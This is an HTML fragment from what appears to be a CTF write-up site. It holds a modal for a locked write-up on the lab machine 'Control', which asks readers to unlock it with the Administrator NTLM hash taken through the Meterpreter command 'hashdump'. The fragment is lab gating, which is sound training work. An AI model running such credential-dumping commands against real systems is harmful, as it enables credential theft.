flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script><div class="modal fade" id="howModal" tabindex="-1" role="dialog" aria-hidden="true" style="display: none;"><div class="modal-dialog"><div class="modal-content"><div class="modal-header text-center"><div class="row"><div class="col-lg-12"> <img src="/img/Control/icon.png" style="height: 40px"><h4 data-toc-skip class="modal-title">CONTROL</h4><small>This is an active Windows machine. You will need Administrator hash to read the content</small><br></div></div></div><div class="modal-body"><div class="row"><div class="col-lg-12"><h4 data-toc-skip>How to unlock</h4><span class="subscriptionInfo"><p><i class="fas fa-hashtag"></i> Get machine's Administrator NTLM hash<br> <code class="highlighter-rouge"><small>meterpreter > hashdump</small></code></p><p><i class="fas fa-hashtag"></i> Hash<br> <code class="highlighter-rouge"><small>echo "{ value }" | md5sum</small></code></p><p><i class="fas fa-sign-in-alt"></i> Add hash below</p></span><div class="row"><div class="col-lg-8"> <input type="text" placeholder="Insert hash here.." value="" name="key" id="key" class="form-control"></div><div class="col-lg-4"> <span role="button" tabindex="0"> <button id="decrypt" tabindex="-1" type="submit" class="decrypt-btn" style="background-color: rgb(154, 204, 20); border-color: rgb(154, 204, 20); color: white;"> Decrypt </button> </span></div></div></div><div class="col-lg-12 text-center m-t-md" id="recurlyBalanceControlPanel"> You have <span class="text-warning">-</span> remaining attempt</div></div></div><div class="modal-footer"> <button type="button" class="btn btn-default" data-dismiss="modal"><i class="far fa-times"></i></button></div></div></div></div>
